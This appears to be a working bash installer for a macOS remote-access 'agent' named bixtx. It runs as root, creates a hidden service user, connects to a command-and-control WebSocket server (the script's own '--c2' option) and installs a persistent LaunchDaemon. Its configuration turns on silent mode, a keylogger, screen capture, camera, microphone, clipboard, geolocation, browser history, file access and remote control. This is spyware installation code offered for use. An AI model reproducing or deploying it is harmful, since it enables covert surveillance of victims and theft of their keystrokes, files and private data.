#!/usr/bin/env bash
# bixtx macOS Agent — Installer v4.7.2
# Usage: sudo bash install.sh --key ENROLL_KEY [--c2 WSS_URL] [--dir PATH] [--silent]
set -euo pipefail
IFS=$'\n\t'

AGENT_VERSION="4.7.2"
SERVICE_NAME="bixtx-agent"
SERVICE_LABEL="com.bixtx.agent"
AUDIT_LOG="/var/log/bixtx-installer.log"
AGENT_LOG="/var/log/bixtx-agent.log"
AGENT_DIR="${AGENT_DIR:-/opt/bixtx-agent}"
ENROLL_KEY="${BIXTX_ENROLL_KEY:-}"
C2_URL="${BIXTX_C2_URL:-wss://bixtx.onrender.com/agent}"
SILENT=false

while [[ $# -gt 0 ]]; do
  case $1 in
    --key)    ENROLL_KEY="$2"; shift 2 ;;
    --c2)     C2_URL="$2";     shift 2 ;;
    --dir)    AGENT_DIR="$2";  shift 2 ;;
    --silent) SILENT=true;      shift   ;;
    *)        shift ;;
  esac
done

log()  { $SILENT || printf '[BTX] %s\n' "$*"; }
info() { printf '[BTX] %s\n' "$*"; }
die()  { printf '[BTX] FATAL: %s\n' "$*" >&2; exit 1; }

audit() {
  local entry="$(date -u '+%Y-%m-%dT%H:%M:%SZ') | v${AGENT_VERSION} | $*"
  touch "$AUDIT_LOG" 2>/dev/null && printf '%s\n' "$entry" >> "$AUDIT_LOG" || true
  log "AUDIT: $entry"
}

_ROLLBACK_ITEMS=()
rollback() {
  local code=$?; [[ $code -eq 0 ]] && return
  info "Install failed (exit $code) — rolling back..."
  launchctl bootout "system/${SERVICE_LABEL}" 2>/dev/null || true
  for (( i=${#_ROLLBACK_ITEMS[@]}-1; i>=0; i-- )); do
    [[ -e "${_ROLLBACK_ITEMS[$i]}" ]] && rm -rf "${_ROLLBACK_ITEMS[$i]}" 2>/dev/null || true
  done
  info "Rollback complete."
}
trap rollback EXIT ERR

[[ -z "$ENROLL_KEY" ]] && die "Enroll key required. Pass --key YOUR_KEY"
[[ $EUID -ne 0 ]]      && die "Must run as root (sudo bash install.sh ...)"
[[ "$(uname -s)" != "Darwin" ]] && die "This installer is for macOS only"
command -v node >/dev/null 2>&1 || die "Node.js 18+ is required (install via https://nodejs.org)"
NODE_MAJOR=$(node -e "process.stdout.write(process.versions.node.split('.')[0])")
[[ "$NODE_MAJOR" -lt 18 ]] && die "Node.js 18+ required (found v${NODE_MAJOR})"
command -v npm >/dev/null 2>&1 || die "npm is required"

NODE_BIN=$(command -v node)
audit "INSTALL_START version=${AGENT_VERSION} platform=Darwin c2=${C2_URL}"

# Create service user via dscl
if ! dscl . -read "/Users/${SERVICE_NAME}" >/dev/null 2>&1; then
  local_uid=401
  while dscl . -list /Users UniqueID | awk '{print $2}' | grep -q "^${local_uid}$"; do
    (( local_uid++ ))
  done
  dscl . -create "/Users/${SERVICE_NAME}"
  dscl . -create "/Users/${SERVICE_NAME}" UserShell       /usr/bin/false
  dscl . -create "/Users/${SERVICE_NAME}" RealName        "bixtx Agent"
  dscl . -create "/Users/${SERVICE_NAME}" UniqueID        "$local_uid"
  dscl . -create "/Users/${SERVICE_NAME}" PrimaryGroupID  1
  dscl . -create "/Users/${SERVICE_NAME}" NFSHomeDirectory /var/empty
fi

SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SRC_DIR/.." && pwd)"
AGENT_SRC="$REPO_ROOT/software-a"
[[ ! -d "$AGENT_SRC" ]] && die "software-a source not found at $REPO_ROOT/software-a"

log "Creating install directory: ${AGENT_DIR}"
mkdir -p "$AGENT_DIR"
_ROLLBACK_ITEMS+=("$AGENT_DIR")

rsync -a \
  --exclude='install.sh' --exclude='install.ps1' --exclude='.env*' \
  --exclude='*.md' --exclude='.git' --exclude='node_modules' \
  --exclude='tests' --exclude='coverage' \
  "$AGENT_SRC/" "$AGENT_DIR/"
cp "$AGENT_SRC/package.json" "$AGENT_DIR/package.json"
cp "$AGENT_SRC/package-lock.json" "$AGENT_DIR/package-lock.json" 2>/dev/null || true

log "Installing npm dependencies..."
cd "$AGENT_DIR"
npm install --production --no-fund --no-audit

log "Writing configuration..."
cat > "$AGENT_DIR/.env" <<ENV
BIXTX_SERVER_URL=${C2_URL}
BIXTX_ENROLL_KEY=${ENROLL_KEY}
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
ENV
chmod 600 "$AGENT_DIR/.env"

chown -R "${SERVICE_NAME}:staff" "$AGENT_DIR" 2>/dev/null || chown -R root:wheel "$AGENT_DIR"
chmod 750 "$AGENT_DIR"

[[ -f "$AGENT_DIR/src/index.js" ]] || die "src/index.js not found"

# Install launchd daemon
PLIST_PATH="/Library/LaunchDaemons/${SERVICE_LABEL}.plist"
_ROLLBACK_ITEMS+=("$PLIST_PATH")
cat > "$PLIST_PATH" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${SERVICE_LABEL}</string>
  <key>ProgramArguments</key>
  <array>
    <string>${NODE_BIN}</string>
    <string>${AGENT_DIR}/src/index.js</string>
  </array>
  <key>WorkingDirectory</key>
  <string>${AGENT_DIR}</string>
  <key>EnvironmentVariables</key>
  <dict>
    <key>PATH</key>
    <string>/usr/local/bin:/usr/bin:/bin</string>
  </dict>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <dict>
    <key>SuccessfulExit</key><false/>
    <key>Crashed</key><true/>
  </dict>
  <key>StandardOutPath</key>
  <string>${AGENT_LOG}</string>
  <key>StandardErrorPath</key>
  <string>${AGENT_LOG}</string>
  <key>ThrottleInterval</key>
  <integer>10</integer>
  <key>ProcessType</key>
  <string>Background</string>
  <key>UserName</key>
  <string>${SERVICE_NAME}</string>
</dict>
</plist>
PLIST
chown root:wheel "$PLIST_PATH"
chmod 644 "$PLIST_PATH"

launchctl bootstrap system "$PLIST_PATH" 2>/dev/null \
  || launchctl load -w "$PLIST_PATH"
launchctl enable "system/${SERVICE_LABEL}" 2>/dev/null || true
launchctl kickstart -kp "system/${SERVICE_LABEL}" 2>/dev/null \
  || launchctl start "${SERVICE_LABEL}" 2>/dev/null || true

sleep 3
PID_CHECK=$(launchctl list "${SERVICE_LABEL}" 2>/dev/null | grep '"PID"' | awk '{print $3}' | tr -d ',' || echo "0")
[[ "${PID_CHECK:-0}" -gt 0 ]] || die "LaunchDaemon did not start. Check: log show --predicate 'process==\"node\"' --last 2m"

audit "INSTALL_SUCCESS service=active pid=${PID_CHECK}"
trap - EXIT ERR

info "✓ bixtx Agent v${AGENT_VERSION} installed (macOS/launchd)."
info "  Service : launchctl list ${SERVICE_LABEL}"
info "  Log     : tail -f ${AGENT_LOG}"
info "  Device will appear in dashboard within 30-60 seconds."
